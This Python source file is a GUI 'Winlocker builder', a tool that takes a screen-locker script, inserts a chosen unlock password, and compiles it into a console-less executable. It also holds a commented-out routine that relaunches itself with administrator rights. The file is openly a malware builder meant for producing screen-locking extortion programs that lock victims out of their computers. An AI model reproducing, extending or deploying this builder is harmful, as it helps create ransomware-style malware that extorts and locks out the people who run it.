import engine
import os
import tkinter
from tkinter import messagebox, ttk, filedialog
import json
import sys
import ctypes

# if ctypes.windll.shell32.IsUserAnAdmin():
#         pass
# else:
#     if not ctypes.windll.shell32.IsUserAnAdmin():
#         result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, "".join([f'"{arg}"' for arg in sys.argv]), None, 1)
#         if result > 32:
#             sys.exit(0)
#         else:
#             sys.exit(0)

config = {
    "gui_enabled": True,
    "compile": True
}

compile = True
noconsole = True
add_files = ['sound1.wav']
add_modules=[]
show_log = True

def save_config(data):
    with open("config.json", "w", encoding="utf-8") as file:
        json.dump(data, file)

def load_config():
    try:
        with open("config.json", "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception:
        save_config(config)
        data = config
    return data

config = load_config()


bg_color1 = "#0A0A0A"
color1 = "white"
color2 = "#B6FF00"

result = "File not selected"
result2 = ""

root = tkinter.Tk()
root.title("Winlocker builder")

root.geometry("750x750")
root.config(bg=bg_color1)
root.wm_attributes('-toolwindow', True)

def file_exists(path: str):
    if os.path.exists(path):
        return True
    else:
        return False

    
def select_file():
    global target_path, target_file
    path = filedialog.askopenfilename(
        title="Select file",
        initialdir="Desktop",
        filetypes=[
            ("Python script", "*.py")
        ]
    )
    if path:
        target_path = path
        target_file = os.path.basename(target_path)
        file_text.config(text=f"File: {target_file}")
    else:
        file_text.config(text=f"File: Not selected")
        target_path = ""
        target_file = ""

def show_text1():
    result_text.pack(pady=25, anchor="center")
    path_text.pack(pady=25, anchor="center")
    root.after(2500, hide_text1)


def hide_text1():
    result_text.pack_forget()
    path_text.pack_forget()


def obfuscate_file():
    global result
    with open(target_file, 'r', encoding="utf-8") as f:
        content = f.read()

    password = password_input.get()
    
    content = content.replace("pas = ''", f"pas = '{password}'")
    with open('build.py', 'w', encoding="utf-8") as build:
        build.write(content)

    path = os.path.join(script_dir, 'build.py')

    output, file_path = engine.main(path, compile_file, noconsole, add_files, add_modules, show_log)
    if output == 1:
        result = f"Winlocker builded"
        result2 = f"Winlocker path: {file_path}"
    else:
        result = f"Can't build winlocker\nError: {file_path}"
        result2 = ""
    result_text.config(text=result)
    path_text.config(text=result2)
    show_text1()


target_file = "locker.py"
if getattr(sys, 'frozen', False):
    script_dir = os.path.dirname(sys.executable)
else:
    script_dir = os.path.dirname(os.path.abspath(__file__))


target_path = os.path.join(script_dir, target_file)
compile_file = True

created_by = tkinter.Label(text="Winlocker builder [v1.0]\nCreated by: @frozzzyyy228", bg=bg_color1, fg=color1, font="Arial 15")
created_by.pack(anchor="w")

# select_button = tkinter.Button(text="Select file", bg=color2, fg=bg_color1, font="Arial 15", command=lambda:select_file())
# select_button.pack(pady=50, anchor="center")

file_text = tkinter.Label(text=f"File: {target_file}", bg=bg_color1, fg=color2, font="Arial 25")
file_text.pack(padx=20, pady=75, anchor="w")

text_password = tkinter.Label(text='Enter password:', bg=bg_color1, fg=color2, font='Arial 14')
password_input = tkinter.Entry(bg="white", font='Arial 20')


text_password.pack(anchor='w')
password_input.place(anchor='center', x=300, y=260)

obfuscate_button = tkinter.Button(text="Build", bg=color2, fg=bg_color1, font="Arial 25", command=lambda:obfuscate_file())
obfuscate_button.pack(pady=75, anchor="center")

result_text = tkinter.Label(text=result, font="Arial 30", bg=bg_color1, fg=color2)
path_text = tkinter.Label(text=result2, font="Arial 10", bg=bg_color1, fg=color2)

if not(config["gui_enabled"]):
    root.withdraw()

root.mainloop()